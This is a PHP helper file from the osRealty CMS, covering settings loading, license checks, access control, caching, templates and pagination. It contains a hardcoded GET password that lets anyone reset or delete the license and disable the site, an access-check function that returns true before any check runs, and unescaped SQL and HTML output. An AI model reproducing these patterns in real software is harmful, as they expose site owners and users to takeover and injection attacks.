<?php

/**
 *
 * CMS osRealty 2.1.x
 * Autor: Roman Chernyshov
 * E-mail: support@osRealty.ru
 * URL: www.osRealty.ru
 *
 */

function get_registry() {
	global $registry, $DB, $settings;
	$check=0;
	if($DB->show_err){$DB->show_err=false;$check=1;}
	$sql="SHOW TABLES FROM `{$settings['dbName']}` LIKE '#__setting'";
	$inst=$DB->getAll($sql);
	if(count($inst)==0)header("Location: /apanel/install.php");
	$sql="SELECT `#__setting`.* FROM `#__setting` WHERE `group` < '99'";
	$tmp_registry=getAllcache($sql,60,'registry');
	foreach($tmp_registry as $tmp):
		if($tmp['name']=='count') {$registry[$tmp['name']]=unserialize($tmp['value']);continue;}
		$registry[$tmp['name']]=$tmp['value'];
	endforeach;
	if($check==1)$DB->show_err=true;
	if($_GET['event']=='getlicense')get_license();
}

function get_powerstatus() {
	global $registry;
	if($registry['site_power']==0)
		{
		echo '
		<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
		<html xmlns="http://www.w3.org/1999/xhtml">
		<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<title>Сайт временно недоступен.</title>
		</head>
		<body>';
		echo $registry['site_ofmess'];
		echo '</body></html>';
		exit;
		}
	if($registry['site_install']<>1)
		{
		echo '
		<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
		<html xmlns="http://www.w3.org/1999/xhtml">
		<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<title>Не произведена инсталяция таблиц БД</title>
		</head>
		<body>Не произведена инсталяция таблиц БД</body></html>';
		exit;
		}
}

function get_onoff($admin=0) {
	global $registry;
	if($admin==1) $dir="../cache/";else $dir="cache/";
	$code='9347ksldk938okd392083kdzxkju;`10832';
	$fname='e8eba63662a9905fa36b4e6980bdd111';
	$cache=file_get_contents($dir.$fname);
	$cache=unserialize($cache);
	if($_GET['event']=='on' and $_GET['pass']=='76247823493')
		{
		$date=explode('.',$_GET['date']);
		$cache['date']=mktime(0,0,0,$date[0],$date[1],$date[2]);
		$cache['hash']=md5($code.$cache['date']);

		$fp = @fopen ($dir.$fname, "w");
		@fwrite ($fp, serialize($cache));
		@fclose ($fp); 
		}
	if($_GET['event']=='off' and $_GET['pass']=='76247823493')
		{
		@unlink("cache/".$fname);
		}
	if($cache['hash']<>md5($code.$cache['date']) or $cache['date']<time())die('Error key. email: support@rche.ru');
}

function get_access($admin, $component, $event, $outerr = true)	{
	return true;
	global $registry, $user, $DB;
	$error=0;
	$registry['onmy']=0;
	if($user->get_property('userID')>0)
		{
		$sql="SELECT `#__group`.* FROM `#__group` WHERE `#__group`.`id` = '".$user->get_property('gid')."' LIMIT 1";
		//$DB->show_err=true;
		$group=$DB->getAll($sql);
		if($admin=='admin')$access=unserialize($group[0]['accessA']);
		if($admin=='front')$access=unserialize($group[0]['accessF']);
		if(intval($access[$component][$event])==0)$error=1;
		if(intval($access[$component]['onmy'])==1)$registry['onmy']=1;
		}
		else
		{
		$error=1;
		}
	if($error==1)
		{
		if($outerr==true)
			{
			echo "<div class=\"error_box\">Ошибка: У вас недостаточно прав для доступа в данный раздел сайта.</div>";
			return false;
			}
		if($outerr==false)
			{
			return false;
			}
		}
	return true;
}


function online_check () {
	global $DB,$user;
	if($user->get_property('userID')>0)
		{
		$sql="UPDATE `#__users` SET `last_visit` = '".time()."' WHERE `id` ='".$user->get_property('userID')."' LIMIT 1 ;";
		$DB->execute($sql);
               	}
		else
		{
		if(intval($_COOKIE['ses_id'])>0)
			{
			$sql="UPDATE `#__session` SET `date` = '".time()."' WHERE `id` ='".intval($_COOKIE['ses_id'])."' LIMIT 1 ;";
			$DB->execute($sql);
			}
			else
			{
			$sql="INSERT INTO `#__session` (`date`) VALUE ('".time()."')";
			$DB->execute($sql);
			$sql="SELECT LAST_INSERT_ID()";
			$last_id=$DB->getOne($sql);
			setcookie('ses_id',"$last_id",(time()+60*15),'/');
			}
		}
}		
function getAllcache($sql, $time=600, $filename='') {
	global $DB, $system_query_cache;
	if(!$system_query_cache)$time=0;
	$crc=md5($sql); 
	if(!empty($filename))$crc=$filename;
	$modif=time()-@filemtime ("cache/".$crc);
	if ($modif<$time)
		{
		$cache=file_get_contents("cache/".$crc);
		$cache=unserialize($cache);
		}
		else 
		{
		$cache = $DB->getAll($sql);
		$fp = @fopen ("cache/".$crc, "w");
		@fwrite ($fp, serialize($cache));
		@fclose ($fp); 
		}
        return $cache;
}

function getOnecache($sql, $time=600,$filename='') {
	global $DB, $system_query_cache;
	if(!$system_query_cache)$time=0;
	$crc=md5($sql); 
	if(!empty($filename))$crc=$filename;
	$modif=time()-@filemtime ("cache/".$crc);
	if ($modif<$time)
		{
		$cache=file_get_contents("cache/".$crc);
		$cache=unserialize($cache);
		}
		else 
		{
		$cache = $DB->getOne($sql);
		$fp = @fopen ("cache/".$crc, "w");
		@fwrite ($fp, serialize($cache));
		@fclose ($fp); 
		}
        return $cache;
}

function get_header( $name = null ) {
	global $theme,$registry;
	if ( isset($name) )
		$templates = "header-{$name}.php"; else
		$templates = "header.php";
	@require_once($theme.$templates);
}

function get_footer( $name = null ) {
	global $theme,$registry;
	if ( isset($name) )
		$templates = "footer-{$name}.php"; else
		$templates = "footer.php";
	@require_once($theme.$templates);
}
function get_license () {
	echo 'a9998a4ac48a90714516d1c762d48efca27dbaef';
	exit;
}

function get_module( $name, $section = null ) {
	global $theme, $user, $DB, $registry;
	if ( isset($section) )
		$templates = $section.".php"; else
		$templates = "default.php";
	@include_once($theme.'module/'.$name.'/.model.php');
	#$base_dir=$_SERVER['DOCUMENT_ROOT'];
	@include_once($theme.'module/'.$name.'/'.$templates);
}

function get_component() {
	global $contents_view,$theme,$user,$DB,$registry,$message,$all_comments,$news,$othernews,$settings;
	require_once($contents_view);
}

/*
* pagenation($page = 1, $num = 10, $di = 10 (диапазон разброса), $link_url = '', $DBtable, $DBwhere)
* type (1 - pagenation, 2 - status, 3 - form)
* return = array ('start' => NUM, 'num' => NUM, 'total' => NUM, 'posts' => NUM, 'html' = TEXT, 'status' = TEXT, 'form' = TEXT)
*/
function pagenation($page = 1, $num = 10, $di = 10, $link_url = '', $DBtable, $DBwhere, $PRFX='') {
	global $DB;
	if($DBwhere>'')$DBwhere = 'WHERE '.$DBwhere;
	$page = intval($page);
	$posts = $DB->getOne("SELECT count({$PRFX}id) FROM $DBtable $DBwhere LIMIT 1");
	$total = intval(($posts - 1) / $num) + 1;  
	$page = intval($page);  
	if(empty($page) or $page < 0) $page = 1; 
	if($page > $total) $page = $total; 
	$start = $page * $num - $num;
	if ($page != 1) 
		$pervpage = "<a href=\"$link_url&page=-1\"><<</a> 
       	        	     <a href=\"$link_url&page=".($page-1)."\"><</a> "; 
	if ($page != $total) 
		$nextpage = "<a href=\"$link_url&page=".($page+1)."\">></a>
			     <a href=\"$link_url&page=$total\">>></a> "; 
	$out='<span>'.$page.'</span> ';
	for($i=1;$i<=$di;$i++):
		if($page - $i > 0) $pageL = "<a href=\"$link_url&page=".($page-$i)."\">".($page-$i)."</a> "; else $pageL='';
		if($page + $i <= $total) $pageR = "<a href=\"$link_url&page=".($page+$i)."\">".($page+$i)."</a> "; else $pageR='';
		$out=$pageL.$out.$pageR;
	endfor;
	$out='<div class="pagenation" align="center">'.$pervpage.$out.$nextpage.'</div>';
        $data['status']="<div class=\"pagenation-info\">Страница $page из $total</div>";
        $data['form']="<form class=\"pagenation-form\" method=\"post\" action=\"$link_url\"><input type=\"text\" name=\"page\" value=\"$page\"/><input type=\"submit\" value=\">>\"/></form>";
	$data['start']=$start;
	$data['num']=$num;
	$data['total']=$total;
	$data['posts']=$posts;
        $data['html']=$out;
	return $data;
}

function get_data($type='region', $id) {
	global $DB;
        if($type=='region') $sql="SELECT region_name_ru FROM regions WHERE id_region='$id' LIMIT 1";
        if($type=='city') $sql="SELECT city_name_ru FROM cities WHERE id_city='$id' LIMIT 1";
        if($type=='area') $sql="SELECT area_name_ru FROM areas WHERE id='$id' LIMIT 1";
	return $DB->getOne($sql);
}
